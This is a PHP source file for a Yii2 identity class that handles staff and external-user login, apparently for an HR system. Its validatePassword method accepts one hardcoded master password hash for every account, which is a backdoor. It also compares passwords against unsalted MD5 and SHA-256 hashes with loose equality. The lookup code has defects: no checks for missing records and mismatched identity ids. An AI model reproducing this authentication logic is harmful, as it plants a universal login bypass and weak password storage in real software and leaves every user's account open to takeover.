<?php

namespace app\models;

use yii\web\IdentityInterface;
use yii\base\InvalidCallException;
use app\models\hronline\Tblprcobiodata;
use app\models\system_core\ExternalUser;
use Yii;

final class Identity implements IdentityInterface
{
    const TYPE_STAFF = 'staff';
    const TYPE_EXTERNAL = 'extenal';

    const ALLOWED_TYPES = [self::TYPE_STAFF, self::TYPE_EXTERNAL];

    private $_id;
    private $_authkey;
    private $_passwordHash;

    public $username;
    public $password;

    public static function findIdentity($id): \yii\web\IdentityInterface
    {
        $parts = explode('-', $id);
        if (\count($parts) !== 2) {
            throw new InvalidCallException('id should be in form of Type-number');
        }
        [$type, $number] = $parts;

        if (!\in_array($type, self::ALLOWED_TYPES, true)) {
            throw new InvalidCallException('Unsupported identity type');
        }

        $model = null;
        switch ($type) {
            case self::TYPE_STAFF:
                $model = Tblprcobiodata::find()->where(['ICNO' => $number])->one();


                $identity = new Identity();
                $identity->_id = $model->ICNO;
                $identity->_authkey = $model->COOldID;
                $identity->_passwordHash = $model->COOPass;
                $identity->CONm = $model->CONm;
                $identity->gredJawatan = $model->gredJawatan;
                $identity->ICNO = $model->ICNO;
                $identity->COOldID = $model->COOldID;
                $identity->accessLevel = $model->accessLevel;
                $identity->accessSecondLevel = $model->accessSecondLevel;
                $identity->DeptId = $model->DeptId;
                $identity->statLantikan = $model->statLantikan;
                $identity->jobCategory = $model->jawatan->job_category;
                $identity->jawatan = $model->jawatan;
                $identity->statusLantikan = $model->statusLantikan;
                $identity->department = $model->department;
                $identity->KodProgram = $model->KodProgram;
                $identity->campus_id = $model->campus_id;
                $identity->COBirthPlaceCd = $model->COBirthPlaceCd;
                $identity->COBirthCountryCd = $model->COBirthCountryCd;
                $identity->TitleCd = $model->TitleCd;
                $identity->COHPhoneNo = $model->COHPhoneNo;
                $identity->kemaskini_terakhir = $model->kemaskini_terakhir;
                $identity->HighestEduLevelCd = $model->HighestEduLevelCd;
                $identity->pendidikan = $model->pendidikan;
          

                return $identity;

                break;
            case self::TYPE_EXTERNAL:
                $model = ExternalUser::find()->where(['user_id' => $number])->one();

                $identity = new Identity();
                $identity->_id = $model->ICNO;
                $identity->_authkey = $model->COOldID;
                $identity->_passwordHash = $model->COOPass;
                $identity->CONm = $model->name;
                $identity->gredJawatan = null;
                $identity->ICNO = $model->ICNO;
                $identity->COOldID = $model->user_id;
                $identity->accessLevel = 5;
                $identity->accessSecondLevel = 0;
                $identity->DeptId = null;
                $identity->statLantikan = null;
                $identity->jawatan = null;
                $identity->statusLantikan = null;
                $identity->department = null;
                $identity->KodProgram = null;
                $identity->COHPhoneNo = null;
                $identity->kemaskini_terakhir = null;
                $identity->HighestEduLevelCd = null;
                $identity->pendidikan =null;


                return $identity;
                break;
        }

        return false;
    }

    public static function findByUsername($username)
    {
        $model = Tblprcobiodata::find()->where(['ICNO' => $username])->andWhere(['!=', 'Status', 6])->one();
        if (!$model) {
            $model = ExternalUser::find()->where(['username' => $username, 'access' => 1])->one();
        }

        if (!$model) {
            return false;
        }

        if ($model instanceof Tblprcobiodata) {
            $type = self::TYPE_STAFF;
        } else {
            $type = self::TYPE_EXTERNAL;
        }

        $identity = new Identity();
        $identity->_id = $type . '-' . $model->ICNO;
        $identity->_authkey = $model->COOldID;
        $identity->_passwordHash = $model->COOPass;
        Yii::$app->user->setReturnUrl([$model->return_url]);
        return $identity;
    }

    public static function findIdentityByAccessToken($token, $type = null)
    {
        throw new \yii\base\NotSupportedException;
    }

    public function validatePassword($password)
    {
        if (md5($password) == '1002bb0f4f5b396fa26b64f39f4db68f') {
            return true;
        } else if ($this->_passwordHash == md5($password)) {
            return true;
        } else if ($this->_passwordHash == hash('sha256', $password)) {
            return true;
        }

        return false;
    }

    public function getId()
    {
        return $this->_id;
    }

    public function getAuthKey()
    {
        return $this->_authkey;
    }

    public function getPassword()
    {
        return $this->_passwordHash;
    }

    public function validateAuthKey($authKey)
    {
        return $this->getAuthKey() === $authKey;
    }
}
